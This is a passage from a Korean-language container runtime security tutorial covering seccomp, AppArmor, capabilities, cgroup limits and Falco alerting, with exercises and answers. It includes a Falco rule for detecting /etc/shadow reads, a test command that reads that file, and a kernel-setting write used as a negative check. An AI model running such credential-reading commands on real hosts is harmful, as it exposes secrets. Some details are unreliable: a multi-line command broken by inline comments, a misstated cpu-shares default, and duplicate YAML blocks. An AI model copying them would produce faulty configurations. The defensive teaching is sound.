  program: "jq '{text: .output}' | curl -d @- -X POST https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
EOF

# Email 알림 (ssmtp 사용)
sudo apt-get install -y ssmtp

sudo tee /etc/ssmtp/ssmtp.conf <<'EOF'
root=security@company.com
mailhub=smtp.gmail.com:587
AuthUser=alerts@company.com
AuthPass=your-password
UseSTARTTLS=YES
EOF

# Falco 출력을 이메일로 전송
sudo tee -a /etc/falco/falco.yaml <<'EOF'

program_output:
  enabled: true
  program: |
    #!/bin/bash
    while read line; do
      echo "$line" | mail -s "Falco Alert: Container Security Event" security@company.com
    done
EOF

# PagerDuty 통합
sudo tee -a /etc/falco/falco.yaml <<'EOF'

program_output:
  enabled: true
  program: |
    #!/bin/bash
    while read line; do
      curl -X POST https://events.pagerduty.com/v2/enqueue \
        -H 'Content-Type: application/json' \
        -d "{
          \"routing_key\": \"YOUR_INTEGRATION_KEY\",
          \"event_action\": \"trigger\",
          \"payload\": {
            \"summary\": \"Falco Security Alert\",
            \"severity\": \"error\",
            \"source\": \"falco\",
            \"custom_details\": $(echo "$line")
          }
        }"
    done
EOF

# Falco 재시작
sudo systemctl restart falco
```

---

## 💡 주요 명령어 정리

### Seccomp

```bash
# 상태 확인
docker run --rm alpine grep Seccomp /proc/1/status

# 비활성화 (위험)
docker run --security-opt seccomp=unconfined IMAGE

# 커스텀 프로필
docker run --security-opt seccomp=profile.json IMAGE

# Audit 모드
# profile.json에서 "defaultAction": "SCMP_ACT_LOG" 설정
```

### AppArmor

```bash
# 프로필 로드
sudo apparmor_parser -r /etc/apparmor.d/profile-name

# 상태 확인
sudo aa-status

# 컨테이너에 적용
docker run --security-opt apparmor=profile-name IMAGE

# Complain 모드
sudo aa-complain /etc/apparmor.d/profile-name

# Enforce 모드
sudo aa-enforce /etc/apparmor.d/profile-name

# 로그 확인
sudo dmesg | grep apparmor
sudo aa-logprof
```

### Capabilities

```bash
# 모두 제거
docker run --cap-drop=ALL IMAGE

# 특정 추가
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE IMAGE

# 확인
docker run --rm alpine sh -c 'apk add libcap && capsh --print'

# 복합 설정
docker run \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --cap-add=CHOWN \
  IMAGE
```

### cgroup

```bash
# Memory
docker run --memory=512m --memory-swap=512m IMAGE

# CPU
docker run --cpus=0.5 IMAGE
docker run --cpuset-cpus=0,1 IMAGE
docker run --cpu-shares=512 IMAGE

# PIDs
docker run --pids-limit=100 IMAGE

# Block I/O
docker run --blkio-weight=500 IMAGE
docker run --device-read-bps /dev/sda:10mb IMAGE
docker run --device-write-bps /dev/sda:5mb IMAGE

# 통계 확인
docker stats CONTAINER
```

### Falco

```bash
# 설치 (Ubuntu)
sudo apt-get install falco

# 시작
sudo systemctl start falco

# 로그 확인
sudo journalctl -fu falco

# 룰 검증
sudo falco -L
sudo falco --validate /etc/falco/rules.d/custom_rules.yaml

# 테스트 모드
sudo falco -M 45
```

---

## 🎓 연습 문제

### 문제 1: 보안 강화 웹 서버

다음 요구사항을 만족하는 nginx 컨테이너를 실행하세요:

1. Seccomp: mount, reboot, ptrace 차단
2. AppArmor: /app만 쓰기 가능, /proc/sys 쓰기 금지
3. Capabilities: NET_BIND_SERVICE만 허용
4. cgroup: Memory 256MB, CPU 0.5 cores, PIDs 50

<details>
<summary>정답 보기</summary>

```bash
# 1. Seccomp 프로필
cat > web-seccomp.json <<'EOF'
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["mount", "umount2", "reboot", "ptrace"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
EOF

# 2. AppArmor 프로필
sudo tee /etc/apparmor.d/docker-web <<'EOF'
#include <tunables/global>

profile docker-web flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  network inet stream,
  network inet6 stream,
  
  / r,
  /app/** rw,
  /tmp/** rw,
  
  deny /proc/sys/** w,
  deny mount,
  
  capability net_bind_service,
}
EOF

sudo apparmor_parser -r /etc/apparmor.d/docker-web

# 3. 컨테이너 실행
docker run -d \
  --name secure-web \
  --security-opt seccomp=web-seccomp.json \
  --security-opt apparmor=docker-web \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --memory=256m \
  --memory-swap=256m \
  --cpus=0.5 \
  --pids-limit=50 \
  -p 80:80 \
  nginx:alpine

# 검증
docker exec secure-web mount  # 실패
docker exec secure-web sh -c 'echo 1 > /proc/sys/kernel/randomize_va_space'  # 실패
docker stats secure-web  # 리소스 제한 확인
```

</details>

### 문제 2: Falco 룰 작성

컨테이너에서 `/etc/shadow` 파일 읽기 시도를 탐지하는 Falco 룰을 작성하세요.

<details>
<summary>정답 보기</summary>

```yaml
- rule: Read Sensitive File
  desc: Detect attempts to read /etc/shadow
  condition: >
    container and
    open_read and
    fd.name = /etc/shadow
  output: >
    Sensitive file access detected
    (user=%user.name command=%proc.cmdline file=%fd.name
    container_id=%container.id container_name=%container.name
    image=%container.image.repository)
  priority: CRITICAL
  tags: [container, filesystem, credentials]
```

테스트:
```bash
docker run --rm alpine cat /etc/shadow
# Falco가 알림 생성
```

</details>

### 문제 3: 리소스 제한 계산

3개의 웹 서버 컨테이너를 실행할 때, 각각 다음 리소스를 사용한다면:
- 평균 Memory: 200MB
- 평균 CPU: 30%
- 최대 PIDs: 50

안전한 여유를 고려하여 적절한 제한값을 설정하세요.

<details>
<summary>정답 보기</summary>

```bash
# 권장 설정 (여유 50% 추가)
docker run -d \
  --name web1 \
  --memory=300m \          # 200MB + 50%
  --memory-swap=300m \
  --memory-reservation=200m \
  --cpus=0.45 \            # 30% + 50%
  --pids-limit=75 \        # 50 + 50%
  nginx:alpine

docker run -d --name web2 --memory=300m --memory-swap=300m --memory-reservation=200m --cpus=0.45 --pids-limit=75 nginx:alpine
docker run -d --name web3 --memory=300m --memory-swap=300m --memory-reservation=200m --cpus=0.45 --pids-limit=75 nginx:alpine

# 전체 리소스 사용량 모니터링
docker stats web1 web2 web3
```

</details>

---

## 📌 핵심 요약

### 런타임 보안 계층

```
┌────────────────────────────────────┐
│ Layer 4: Monitoring                │
│ - Falco (실시간 탐지)                 │
│ - Audit 로그                        │
├────────────────────────────────────┤
│ Layer 3: MAC (AppArmor/SELinux)    │
│ - 파일 접근 제어                      │
│ - 네트워크 제어                       │
├────────────────────────────────────┤
│ Layer 2: Seccomp                   │
│ - Syscall 필터링                     │
│ - 300+ → 50개로 축소                 │
├────────────────────────────────────┤
│ Layer 1: Capabilities              │
│ - 권한 세분화                         │
│ - 30+ → 1-2개로 축소                 │
├────────────────────────────────────┤
│ Layer 0: cgroup                    │
│ - 리소스 격리                         │
│ - DoS 방지                          │
└────────────────────────────────────┘
```

### 보안 메커니즘 비교

| 메커니즘 | 목적 | 장점 | 단점 |
|---------|------|------|------|
| **Seccomp** | Syscall 필터 | - 커널 레벨 방어<br>- 공격 표면 최소화 | - 디버깅 어려움<br>- 호환성 문제 가능 |
| **AppArmor** | 파일/네트워크 접근 제어 | - 구현 간단<br>- Ubuntu 기본 | - 프로필 관리 필요<br>- SELinux보다 약함 |
| **SELinux** | 강제 접근 제어 | - 매우 강력<br>- 세밀한 제어 | - 복잡함<br>- 학습 곡선 높음 |
| **Capabilities** | 권한 세분화 | - Root 불필요<br>- 세밀한 제어 | - 많은 수 (38개)<br>- 이해 필요 |
| **cgroup** | 리소스 격리 | - DoS 방지<br>- 안정성 향상 | - 오버헤드<br>- 튜닝 필요 |
| **Falco** | 실시간 탐지 | - 즉각 대응<br>- 상세 로깅 | - 리소스 사용<br>- False positive |

### 실무 Best Practices

**1. Seccomp 전략**
```bash
# Development: audit 모드
--security-opt seccomp=audit-profile.json

# Staging: 제한적 프로필
--security-opt seccomp=strict-profile.json

# Production: 최소 프로필
--security-opt seccomp=minimal-profile.json
```

**2. AppArmor/SELinux**
```bash
# 개발 시작: complain 모드로 필요 권한 파악
sudo aa-complain /etc/apparmor.d/docker-app

# 프로필 완성 후: enforce 모드
sudo aa-enforce /etc/apparmor.d/docker-app
```

**3. Capabilities**
```bash
# 기본 원칙: 모두 제거 후 필요한 것만 추가
--cap-drop=ALL --cap-add=<NEEDED>

# 웹: NET_BIND_SERVICE
# DB: CHOWN, DAC_OVERRIDE
# 로거: CHOWN, DAC_OVERRIDE
```

**4. cgroup 리소스 제한**
```
권장 여유: 평균 사용량 + 50%
Memory: 200MB 평균 → 300MB 제한
CPU: 30% 평균 → 45% 제한
```

**5. Falco 모니터링**
```yaml
# 우선순위별 대응
CRITICAL: 즉시 알림 (Slack, PagerDuty)
ERROR: 15분 내 확인
WARNING: 일일 리포트
INFO: 주간 리포트
```

### 보안 체크리스트

**컨테이너 실행 시:**
- [ ] Seccomp 프로필 적용
- [ ] AppArmor/SELinux 프로필 적용
- [ ] Capabilities 최소화
- [ ] Memory 제한 설정
- [ ] CPU 제한 설정
- [ ] PIDs 제한 설정
- [ ] 비특권 사용자 실행
- [ ] Read-only 파일시스템
- [ ] Falco 모니터링 활성화

**프로덕션 배포 시:**
- [ ] 모든 보안 계층 적용
- [ ] 리소스 제한 테스트
- [ ] Falco 룰 검증
- [ ] 알림 시스템 통합
- [ ] 정기 보안 감사
- [ ] 인시던트 대응 계획

---

## 📚 참고 자료

- [Docker Security - Runtime Security](https://docs.docker.com/engine/security/)
- [Falco Documentation](https://falco.org/docs/)
- [Linux Cgroups](https://www.kernel.org/doc/Documentation/cgroup-v2.txt)
- [OOM Killer](https://www.kernel.org/doc/gorman/html/understand/understand016.html)
- [PID Namespace](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)

---

## 🤔 생각해볼 문제

1. 메모리 제한을 설정했는데도 호스트가 OOM으로 죽을 수 있을까?
2. Falco는 어떻게 컨테이너 내부 활동을 모니터링할 수 있을까?
3. CPU 제한과 CPU 예약의 차이는 무엇이고, 각각 언제 사용해야 할까?

> 💡 **답변**: 1) 가능 - 메모리 제한(`--memory`)은 컨테이너만 해당, 컨테이너가 메모리 제한 초과 시 해당 컨테이너만 OOM Kill, 하지만 호스트 전체 메모리 고갈은 다른 문제: 여러 컨테이너 합계가 호스트 메모리 초과, Kernel 메모리(Page cache, Buffer) 고갈, Swap 미설정 시 호스트 OOM, 해결: 호스트 메모리의 80% 이하로 컨테이너 할당, `--oom-kill-disable` 절대 사용 금지, Swap 설정 + 모니터링, 2) Falco는 eBPF/Kernel module로 시스템콜을 hook: Container namespace 경계 넘어 모든 syscall 감지, /proc 파일시스템으로 컨테이너 메타데이터 읽기, cgroup 정보로 어느 컨테이너인지 식별, ptrace 없이 성능 영향 최소, 3) CPU 제한(`--cpus 1.5`): 최대 사용 가능 CPU, 초과 시 throttling(제한), Hard limit, 보장 없음, CPU 예약(`--cpu-shares 1024`): 상대적 가중치, 경쟁 시에만 적용, Soft limit, 최소 보장, 예: 제한 1.0 = 최대 1 CPU, 예약 1024 = 다른 컨테이너 대비 2배 우선순위(default 512), 프로덕션: 둘 다 사용(예약으로 최소 보장 + 제한으로 상한선)

---

<div align="center">

**[⬅️ 이전: Image Scanning](./02-Image-Scanning.md)** | **[다음: Secrets Management ➡️](./04-Secrets-Management.md)**

</div>
